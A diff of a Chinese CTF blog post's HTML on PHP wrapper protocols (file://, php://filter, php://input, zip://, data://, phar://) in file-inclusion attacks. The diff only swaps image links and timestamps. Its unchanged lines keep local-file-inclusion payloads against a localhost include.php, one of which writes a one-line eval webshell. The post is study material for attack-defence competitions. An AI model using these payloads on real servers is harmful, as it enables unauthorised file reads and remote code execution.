@@ -25,24 +25,24 @@
 <meta property="og:site_name" content="HackerTerry&#39;s Blog">
 <meta property="og:description" content="前言最近在准备CTF的线下攻防比赛（AWD），看到一篇文章中有师傅提到web漏洞中可能会出现这个知识点，于是在这里归纳总结一下。 正文file:&#x2F;&#x2F; 协议 条件：  allow_url_fopen:off&#x2F;on allow_url_include :off&#x2F;on   作用：用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_u">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQAZ">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQA1">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBb">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBf">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBh">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBi">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBj">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBt">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBu">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBB">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBD">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBP">
-<meta property="og:image" content="https://segmentfault.com/img/bVbrQBX">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_1.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_2.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_3.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_4.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_5.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_6.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_7.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_8.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_9.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_10.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_11.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_12.webp">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/php_protocol_13.webp">
 <meta property="article:published_time" content="2023-03-31T14:01:08.000Z">
-<meta property="article:modified_time" content="2026-07-13T08:09:19.978Z">
+<meta property="article:modified_time" content="2026-07-16T13:31:09.557Z">
 <meta property="article:author" content="HackerTerry">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://segmentfault.com/img/bVbrQAZ">
+<meta name="twitter:image" content="https://rookieterry.github.io/img/notes/php_protocol_1.webp">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -344,7 +344,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：3 天前
+                    本文最后更新于：3 小时前
                   
                 
               </p>
@@ -372,17 +372,17 @@
 <li><p><code>file://[文件的绝对路径和文件名]</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQAZ" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_1.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><code>[文件的相对路径和文件名]</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=./phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQA1" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_2.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><code>[http：//网络路径和文件名]</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBb" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_3.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 </li>
@@ -540,16 +540,16 @@
 <li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=phpinfo.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBf" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_4.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><code>php://input + [POST DATA]</code>执行php代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span><br>[POST DATA部分]<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBh" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_5.webp" srcset="/img/loading.gif" lazyload></p>
 <p>若有写入权限，写入一句话木马</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span><br>[POST DATA部分]<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;1juhua.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBi" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_6.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 </li>
@@ -571,19 +571,19 @@
 <p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBj" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_7.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><code>compress.bzip2://file.bz2</code></p>
 <p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBt" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_8.webp" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><code>compress.zlib://file.gz</code></p>
 <p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBu" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
+<p><img src="/img/notes/php_protocol_9.webp" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -607,12 +607,12 @@
 <li><p><code>data://text/plain,</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBB" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
+<p><img src="/img/notes/php_protocol_10.webp" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
 </li>
 <li><p><code>data://text/plain;base64,</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBD" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
+<p><img src="/img/notes/php_protocol_11.webp" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -632,13 +632,13 @@
 <li><p><strong>示例</strong>：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBP" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
+<p><img src="/img/notes/php_protocol_12.webp" srcset="/img/loading.gif" lazyload alt="图片描述"></p>
 </li>
 </ul>
 <h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://segmentfault.com/img/bVbrQBX" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/notes/php_protocol_13.webp" srcset="/img/loading.gif" lazyload></p>
 <p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p>
 <p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
 
